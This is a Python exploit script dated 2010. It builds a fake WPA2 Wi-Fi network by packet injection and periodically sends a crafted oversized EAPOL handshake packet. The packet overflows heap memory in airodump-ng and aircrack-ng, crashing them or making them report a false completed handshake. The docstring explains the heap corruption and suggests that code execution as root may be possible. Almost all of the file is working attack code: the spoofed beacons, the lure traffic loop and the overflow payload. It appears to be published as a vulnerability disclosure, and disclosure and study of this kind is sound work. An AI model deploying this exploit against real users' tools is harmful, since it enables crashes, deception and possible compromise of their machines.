#!/usr/bin/env python
# -*- coding: UTF-8 -*-

''' A honeypot and remote-exploit against the aircrack-ng tools.
    Tested up to svn r1678.

    The tools' code responsible for parsing IEEE802.11-packets assumes the
    length of a EAPOL-packet to never exceed the maximum size of 256 bytes
    for packets that are part of the EAPOL-authentication.
    We can exploit this by letting the code parse packets which exceed the
    maximum size and overflow data structures allocated on the heap,
    possibly overwriting libc's allocation-related structures.
    This causes heap-corruption and a SIGSEGV or SIGABRT.
    
    Careful layout of the packet's content can even possibly alter the
    instruction-flow through the already well known heap-corruption paths
    in libc. Playing with the proclaimed length of the EAPOL-packet and the
    size and content of the packet's padding immediately end up in various
    assertion errors during calls to free(). This reveals the possibility to
    gain control over $EIP.
    
    Given that we have plenty of room for payload and that the tools are
    usually executed with root-privileges, we should be able to have a
    single-packet-own-everything exploit at our hands. As the attacker can
    cause the various tools to do memory-allocations at his will (through
    faking the appearance of previously unknown clients), the resulting
    exploit-code should have a high probability of success.
    
    The demonstration-code below requires lorcon-1, pylorcon, scapy >= 2.x
    and Pyrit >= 0.3.1-dev r238 to work. It uses packet injection to setup a
    fake IEEE802.11-network with one Access-Point and one Station. To attract
    people to our faked network, some data-traffic is also generated. From time
    to time the "Station" sends a EAPOL-confirmation to the "Access-Point" that
    corrupts airodump-ng's memory structures to either crash it immediately
    or print false information to the user (handshake is shown as if being
    completed). Aircrack-ng will immediately crash when trying to parse the
    generated dump-file as the exploit-payload overwrote the size-field of
    the EAPOL-packet in memory (causing aircrack-ng to compute the EAPOL-MIC
    over invalid memory regions).
    
    http://pyrit.wordpress.com/2010/03/31/aircrack-ng-still-vulnerable/


    03/31/2010, Lukas Lueg
                lukas.lueg@gmail.com
                http://pyrit.googlecode.com

'''

from __future__ import with_statement

import time
import threading

import cpyrit.pckttools
import pylorcon
import scapy.packet
import scapy.fields
from scapy.layers import dot11, l2


class NetworkTransmitter(object):
    """A simple wrapper around pylorcon.Lorcon()"""
    def __init__(self, iface, driver='mac80211'):
        self.tx = pylorcon.Lorcon(iface, driver)
        self.tx.setfunctionalmode('INJECT')

    def setchannel(self, channel):
        self.tx.setchannel(channel)

    def write(self, buf):
        self.tx.txpacket(str(buf))


class AccessPoint(object):
    """A fake Access Point that makes itself known by sending beacons"""

    class AccessPointBeaconizer(threading.Thread):
        """Send beacons announcing the given ESSID, the channel and some fake
           rates and WPA2-information
        """
    
        def __init__(self, ap):
            threading.Thread.__init__(self)
            self.ap = ap
            self.device = NetworkTransmitter(self.ap.iface)
            self.interval = 0.1
            self.beacon_pckt = dot11.Dot11(addr1='ff:ff:ff:ff:ff:ff',       \
                                           addr2=self.ap.bssid,             \
                                           addr3=self.ap.bssid)             \
                               / dot11.Dot11Beacon(cap='ESS+privacy')       \
                               / dot11.Dot11Elt(ID='SSID',                  \
                                                info=self.ap.essid)         \
                               / dot11.Dot11Elt(ID='DSset',                 \
                                                info=chr(self.ap.channel))  \
                               / dot11.Dot11Elt(ID='Rates',                 \
                                                info='\x82\x84\x0b\x16')    \
                               / dot11.Dot11Elt(ID='RSNinfo',
                                                info='\x01\x00\x00\x0f\xac' \
                                                     '\x04\x01\x00\x00\x0f' \
                                                     '\xac\x04\x01\x00\x00' \
                                                     '\x0f\xac\x02\x00\x00')
            self.setDaemon(True)
    
        def run(self):
            while True:
                self.beacon_pckt.SC = self.ap.next_seq()
                now = time.time() - self.ap.starttime
                self.beacon_pckt[dot11.Dot11Beacon].timestamp = now * 1000000
                self.device.write(self.beacon_pckt)
                time.sleep(self.interval)

    
    def __init__(self, iface, bssid, essid, channel):
        self.channel = channel
        self.bssid = bssid
        self.essid = essid
        self.iface = iface
        self.seq = 0
        self.starttime = time.time()
        self.seq_lock = threading.Lock()
        self.beaconizer = self.AccessPointBeaconizer(self)
        self.beaconizer.start()

    def next_seq(self):
        with self.seq_lock:
            self.seq = (self.seq + 16) % 65535
            return self.seq


class Aircracker(threading.Thread):
    """ A fake Wifi-network that includes one Access Point and one Station.
        The network passes around some data to attract the bees and then sends
        the exploit...
    """
    def __init__(self, iface, bssid, essid, channel):
        threading.Thread.__init__(self)
        self.active = True
        self.device = NetworkTransmitter(iface)
        self.device.setchannel(channel)
        self.sta_mac = str(scapy.fields.RandMAC(template='00:*'))
        self.ap = AccessPoint(iface, bssid, essid, channel)

        """A dummy data-packet to generate traffic..."""        
        self.data_pckt = dot11.Dot11(type="Data", addr1=self.sta_mac, \
                                     addr2=bssid, addr3=bssid,        \
                                     FCfield='from-DS')               \
                         / dot11.LLC()                                \
                         / dot11.SNAP()                               \
                         / dot11.EAPOL()                              \
                         / scapy.packet.Padding(load='a'*100)

        """A IEEE802.11-packet with LLC- and SNAP-header, looking like the
           second phase of a EAPOL-handshake (the confirmation). The packet
           will cause an overflow of the "eapol"-field in struct WPA_hdsk as
           defined in aircrack-ng.h and set eapol_size to a bogus value
           (crashing the PTK-calculation), type to 0 and state to 7 (completed
           handshake).
           The last 500 dummy-bytes will crash airodump-ng. Remove those to
           make airodump-ng go on and aircrack-ng show a completed handshake
           for our fake AP. Aircrack-ng will crash while computing the PTK...
        """
        self.xp_pckt = dot11.Dot11(addr1='00:de:ad:c0:de:00',                 \
                                   addr2=self.sta_mac, FCfield='to-DS')       \
                       / dot11.LLC()                                          \
                       / dot11.SNAP()                                         \
                       / l2.EAPOL()                                           \
                       / cpyrit.pckttools.EAPOL_Key()                         \
                       / cpyrit.pckttools.EAPOL_WPAKey(KeyInfo='pairwise+mic')\
                       / scapy.packet.Padding(load=('a'*159)                  \
                                              + '\xff\xff\xff\x0f'            \
                                              + '\x00\x00\x00\x00'            \
                                              + '\x07\x00\x00\x00' + 'a'*300)

        self.setDaemon(True)

    def run(self):
        i = 0
        while self.active:
            i += 1
            # Send a dummy data-packet
            self.data_pckt.SC = self.ap.next_seq()
            self.device.write(self.data_pckt)
            if i % 10 == 0:
                # Send the exploit
                self.device.write(self.xp_pckt)
            time.sleep(0.1)

    def close(self):
        self.active = False
        self.join()


if __name__ == "__main__":
    print "Starting faked network..."
    aircrk = Aircracker('mon0', '00:de:ad:c0:de:00', 'Nobody', 13)
    aircrk.start()
    print "Serving..."
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    aircrk.close()
    print "Done"
